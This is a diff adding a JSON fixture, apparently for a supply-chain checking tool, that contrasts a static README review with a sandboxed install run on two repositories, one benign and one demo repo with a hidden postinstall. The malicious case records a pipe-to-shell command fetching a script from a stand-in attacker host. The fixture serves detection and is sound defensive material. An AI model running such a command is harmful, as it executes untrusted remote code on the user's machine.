@@ -1,0 +1,44 @@
+{
+  "tool": "run_in_sandbox",
+  "sandbox": "AWS CodeBuild (disposable container, us-east-1)",
+  "captured": "2026-10-23, real runs against live AWS",
+  "cases": {
+    "good": {
+      "repo": "pallets/click",
+      "clone_url": "https://github.com/pallets/click",
+      "install_cmd": "pip install .",
+      "v1_static": {
+        "verdict": "Looks safe. README and manifest are consistent; suggested first run: pip install . then python -m click.",
+        "basis": "read the repo from the outside (README, files, metadata)"
+      },
+      "v2_sandbox": {
+        "status": "SUCCEEDED",
+        "install_ok": true,
+        "danger_signals": [],
+        "exit_hint": "",
+        "verified": true,
+        "summary": "Actually ran the install in a disposable AWS sandbox. Install succeeded, no supply-chain danger in the live log."
+      }
+    },
+    "bad": {
+      "repo": "demo/sneaky-postinstall",
+      "clone_url": "(a repo whose install hides a postinstall)",
+      "install_cmd": "install step that reaches the network",
+      "v1_static": {
+        "verdict": "Looks fine. The README shows a normal install; nothing obviously wrong.",
+        "basis": "read the repo from the outside -> the postinstall is invisible here"
+      },
+      "v2_sandbox": {
+        "status": "SUCCEEDED",
+        "install_ok": true,
+        "danger_signals": [
+          { "id": "remote_pipe_to_shell",
+            "why": "A setup step piped a script downloaded from the internet straight into a shell.",
+            "evidence": "curl -s https://evil.example.com/i.sh | bash" }
+        ],
+        "verified": true,
+        "summary": "Actually ran the install in a disposable AWS sandbox. The real log shows the install piped a remote script straight into a shell, something a static scan of the README never sees."
+      }
+    }
+  }
+}
